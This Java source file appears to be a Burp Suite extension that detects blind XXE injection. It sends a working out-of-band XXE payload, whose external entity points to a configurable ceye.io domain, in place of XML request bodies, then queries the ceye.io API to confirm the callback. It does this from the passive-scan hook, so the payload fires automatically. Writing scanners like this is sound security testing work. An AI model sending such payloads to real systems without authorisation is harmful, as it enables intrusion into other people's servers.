package burp;

import java.io.PrintWriter;
import java.lang.reflect.Array;
import java.net.URL;
import java.util.*;

import static burp.IScannerInsertionPoint.*;

public class BurpExtender implements IBurpExtender, IScannerCheck
{
    private IBurpExtenderCallbacks callbacks;
    private IExtensionHelpers helpers;
    private PrintWriter stdout;
    private XxeOption xxeOption;

    //
    // implement IBurpExtender
    //
    @Override
    public void registerExtenderCallbacks(IBurpExtenderCallbacks callbacks)
    {

        // obtain our output and error streams
        stdout = new PrintWriter(callbacks.getStdout(), true);

        // write a message to our output stream
        stdout.println("Author:lufei");


        // keep a reference to our callbacks object
        this.callbacks = callbacks;

        // obtain an extension helpers object
        helpers = callbacks.getHelpers();

        // set our extension name
        callbacks.setExtensionName("XXE Injection");

        // register ourselves as a custom scanner check
        callbacks.registerScannerCheck(this);

        xxeOption = new XxeOption(callbacks);
        //stdout.println(xxeOption.jtf.getText());
    }


    @Override
    public List<IScanIssue> doPassiveScan(IHttpRequestResponse baseRequestResponse) {
        //随机字符串
        String base = "abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ";
        Random random = new Random();
        String flag = "xxe_";

        //通过getStatedMimeType(content-type)判断是否是xml是，或者通过getInferredMimeType（body请求格式）判断是否是xml。都是否的情况下不进行检测
        if(helpers.analyzeResponse(baseRequestResponse.getRequest()).getStatedMimeType().toLowerCase().indexOf("xml") < 0 && helpers.analyzeResponse(baseRequestResponse.getRequest()).getInferredMimeType().toLowerCase().indexOf("xml") < 0)
            return null;


        //获取随机字符串xxe_xxxxxxxxx作为flag，请求ceye，来判断是否接受到http请求。
        for (int i=0;i<10;i++)
        {
            flag = flag + base.charAt(random.nextInt(base.length()));
        }

        //xxe payload
        byte[] xxePayload = ("<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n" +
                "<!DOCTYPE root [\n" +
                "<!ENTITY % remote SYSTEM \"http://" + xxeOption.jtfId.getText() + "/" + flag + "\">\n" +
                "%remote;]>\n" +
                "<root/>").getBytes();

//        stdout.println(helpers.analyzeResponse(baseRequestResponse.getRequest()).getStatedMimeType());
//        stdout.println(helpers.analyzeResponse(baseRequestResponse.getRequest()).getInferredMimeType());


        //修改body为xxe payload，并且发送xxe payload http包
        byte[] xxe = helpers.buildHttpMessage(helpers.analyzeRequest(baseRequestResponse.getRequest()).getHeaders(),xxePayload);
        IHttpRequestResponse checkRequestResponse = callbacks.makeHttpRequest(
                baseRequestResponse.getHttpService(), xxe);

        //构造发送到ceye.io的IHttpService
        IHttpService test = new IHttpService() {
            @Override
            public String getHost() {
                return "api.ceye.io";
            }

            @Override
            public int getPort() {
                return 80;
            }

            @Override
            public String getProtocol() {
                return "http";
            }
        };


        //构造发送到ceye.io的http headers信息
        byte[] ceye = ("GET /v1/records?token=" + xxeOption.jtfToken.getText() + "&type=request&filter=" + flag + " HTTP/1.1\n" +
                "Host: api.ceye.io\n" +
                "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:52.0) Gecko/20100101 Firefox/52.0\n" +
                "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\n" +
                "Accept-Language: zh-CN,en-US;q=0.7,en;q=0.3\n" +
                "Accept-Encoding: gzip, deflate\n" +
                "DNT: 1\n" +
                "Connection: close\n" +
                "Upgrade-Insecure-Requests: 1\n" +
                "\n").getBytes();

        //stdout.println("GET /v1/records?token=" + xxeOption.jtfToken.getText() + "&type=request&filter=" + flag + " HTTP/1.1\n");
        //发送数据包到ceye.io
        IHttpRequestResponse ceyeRequestResponse = callbacks.makeHttpRequest(
                test, ceye);

        //设置ceye的返回包作为漏洞返回包
        checkRequestResponse.setResponse(ceyeRequestResponse.getResponse());
        //获取ceyeRequestResponse(发送到ceye的包)看是否有请求的关键词，如果有则有漏洞。
        List<int[]> matches = getMatches(ceyeRequestResponse.getResponse(), flag.getBytes());
        //checkRequestResponse(发送xee payload的包),对flag进行匹配，然后高亮再请求包中。
        List<int[]> requestMatches = getMatches(checkRequestResponse.getRequest(), flag.getBytes());

        //stdout.println(new String(checkRequestResponse.getRequest()));

        if(matches.size() > 0)
        {
            //报告漏洞
            List<IScanIssue> issues = new ArrayList<>(1);
            issues.add(new CustomScanIssue(
                    baseRequestResponse.getHttpService(),
                    helpers.analyzeRequest(baseRequestResponse).getUrl(),
                    new IHttpRequestResponse[] { callbacks.applyMarkers(checkRequestResponse, requestMatches, matches) },
                    "bind xxe inject",
                    "payload: " + helpers.bytesToString(flag.getBytes()),
                    "High"));
            return issues;
        }
        return null;
    }

    @Override
    public List<IScanIssue> doActiveScan(IHttpRequestResponse baseRequestResponse, IScannerInsertionPoint insertionPoint) {
        return null;
    }

    @Override
    public int consolidateDuplicateIssues(IScanIssue existingIssue, IScanIssue newIssue) {
        if (existingIssue.getIssueName().equals(newIssue.getIssueName()))
            return -1;
        else return 0;
    }

    // helper method to search a response for occurrences of a literal match string
    // and return a list of start/end offsets
    private List<int[]> getMatches(byte[] response, byte[] match)
    {
        List<int[]> matches = new ArrayList<int[]>();

        int start = 0;
        while (start < response.length)
        {
            start = helpers.indexOf(response, match, true, start, response.length);
            if (start == -1)
                break;
            matches.add(new int[] { start, start + match.length });
            start += match.length;
        }

        return matches;
    }

}

//
// class implementing IScanIssue to hold our custom scan issue details
//
class CustomScanIssue implements IScanIssue
{
    private IHttpService httpService;
    private URL url;
    private IHttpRequestResponse[] httpMessages;
    private String name;
    private String detail;
    private String severity;

    public CustomScanIssue(
            IHttpService httpService,
            URL url,
            IHttpRequestResponse[] httpMessages,
            String name,
            String detail,
            String severity)
    {
        this.httpService = httpService;
        this.url = url;
        this.httpMessages = httpMessages;
        this.name = name;
        this.detail = detail;
        this.severity = severity;
    }

    @Override
    public URL getUrl()
    {
        return url;
    }

    @Override
    public String getIssueName()
    {
        return name;
    }

    @Override
    public int getIssueType()
    {
        return 0;
    }

    @Override
    public String getSeverity()
    {
        return severity;
    }

    @Override
    public String getConfidence()
    {
        return "Certain";
    }

    @Override
    public String getIssueBackground()
    {
        return null;
    }

    @Override
    public String getRemediationBackground()
    {
        return null;
    }

    @Override
    public String getIssueDetail()
    {
        return detail;
    }

    @Override
    public String getRemediationDetail()
    {
        return null;
    }

    @Override
    public IHttpRequestResponse[] getHttpMessages()
    {
        return httpMessages;
    }

    @Override
    public IHttpService getHttpService()
    {
        return httpService;
    }


}